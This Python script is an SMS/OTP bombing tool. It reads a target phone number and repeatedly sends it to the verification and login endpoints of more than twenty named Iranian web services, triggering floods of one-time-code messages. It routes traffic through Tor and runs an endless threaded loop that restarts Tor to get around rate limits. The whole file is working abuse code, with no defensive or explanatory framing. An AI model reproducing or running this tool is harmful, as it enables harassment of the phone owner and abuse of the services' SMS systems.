import requests
from time import sleep
from threading import Thread
import os
phone =input("inter your phone : ")
send = 1
proxy = {"socks5": "127.0.0.1:9150"}
def pin(phone):
	 p1= "https://api.pinwork.co/api/v1/customer/verification"
	 p2 = {"cellphone":"0"+phone} 
	 req01 = requests.post(p1,  json=p2, proxies=proxy)
def ach():
	a1 = "https://api.achareh.co/v2/accounts/login/" 
	p00 = {"phone":"98"+phone} 
	re81 = requests.post(a1,data=p00)
def digi():
	d = "https://api.digikalajet.ir/user/login-register/"
	p = {"phone":"0"+phone}
	i = requests.post(d , data = p)
#digi.tamom
def esam():
	em = "https://api.esam.ir/api/account/RegisterOrLogin"
	pm = {
    "mobile": phone,
    "uidtr": 637960871238769386,
    "uid": 2986544,
    "username": "t96bj551",
    "condition": 0
	}
	mm = requests.post(em , data=pm)
	

def roj():
	r2 = "https://rojashop.com/api/auth/sendOtp"
	o2 = {'mobile':'0'+phone}
	re2 = requests.post(r2 , data=o2)
	
def sam():
	sam3= requests.post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={"0"+phone}&platform=PWA')
	
def timc():
	tm4 = "https://api.timcheh.com/auth/otp/send"
	p4 = {"mobile":"0"+phone}
	re4 = requests.post(tm4 , data = p4)

def khod():
	kh5 = "https://khodro45.com/api/v1/customers/otp/"
	p5 ={"mobile":"0"+phone}
	re5 = requests.post(kh5 , data=p5)
	
def deli():
	de6 = "https://www.delino.com/user/register"
	p6={"mobile":"0"+phone}
	re6 = requests.post(de6 , data=p6)
	
def zod():
	zo7 = "https://admin.zoodex.ir/api/v1/check-mobile"
	p7 = {"mobile":"0"+phone}
	re7 = requests.post(zo7 , data = p7)
	
def orki():
	or8 = "https://orders.orkidehrestaurant.com/api/users/send/otp"
	p8 = {"mobile":"0"+phone,"i_am_worker":0,"i_am_market_manager":0}
	re8 = requests.post(or8 , data=p8)
def maha():
	ma9 = "https://api.mahabadfood.ir/api/user/sendApp"
	p9 = {"phone":"0"+phone}
	re9 = requests.post(ma9 , data = p9)
def seko():
	se10 ="https://sekonj.design/api/signin/"
	p10 = {"mobile":"0"+phone}
	re10 = requests.post(se10 , data = p10)
def yab():
	y11 = "https://m.payaneh.ir/api/code/send"
	p11 = {"phone":"0"+phone}
	re11 = requests.post(y11 , data=p11)
def dec():
	de12 ="https://www.offdecor.com/index.php?route=account/login/sendCode"
	p12 ={"phone":"0"+phone}
	req=requests.post(de12,data=p12)
def sha():
	s13 = "https://api.shabesh.com/api/checknumber"
	p13 = {"mobile":"0"+phone}
	req = requests.post(s13 , data= p13)
def faf():
	f14 = "https://api2.fafait.net/oauth/check-user"
	p14 = {"id":"0"+phone}
	re14 = requests.post(f14 , data= p14)
def kha():
	k15 = "https://khajikala.ir/Login/check"
	p15 = {"mob":"0"+phone}
	re15 = requests.post(k15 , data= p15)
def beh():
	b16 = "https://api.behtarino.com/api/v1/businesses/lqfbvhcgvy/vitrin_verification/"
	p16 = {"phone":"0"+phone,"resend":"true"}
	re16 = requests.post(b16 , data= p16)
def bah():
	b17 = "https://api.behtarino.com/api/v1/businesses/lqfbvhcgvy/vitrin_verification/"
	p17 = {"phone":"0"+phone}
	re17 = requests.post(b17 , data= p17)
def sna():
	s18 = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
	p18 = {"cellphone":"+98"+phone}
	re18 = requests.post(s18 , data= p18)
def saf():
	s19 = "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=fa9e9632-68e1-49c0-89d5-6a92614cb051"
	p19 = {"cellphone":"+98"+phone}
	re19 = requests.post(s19 , data= p19)
def oof():
		ur = "https://api.offch.com/auth/otp"
		p = {"username": "0"+phone}
		req = requests.post(ur,data=p)
def na():
	ab = "https://www.homeca.ir/auth/api/send-verify-code/"
	ba = {"phonenumber":"0"+phone}
	qe = requests.post(ab, data=ba)
def fa():
	fa1 = "https://shahrfarsh.com/Account/Login"
	af = {"phoneNumber":"0"+phone}
	ar = requests.post(fa1,data=af)
def do():
	d23 ="https://tj8.ir/auth/register"
	p23 = {"mobile":"0"+phone}
	req23 = requests.post(d23 , data=p23)
	
while True :
		Thread(target=pin, args=[phone]).start()
		os.system("killall -HUP tor")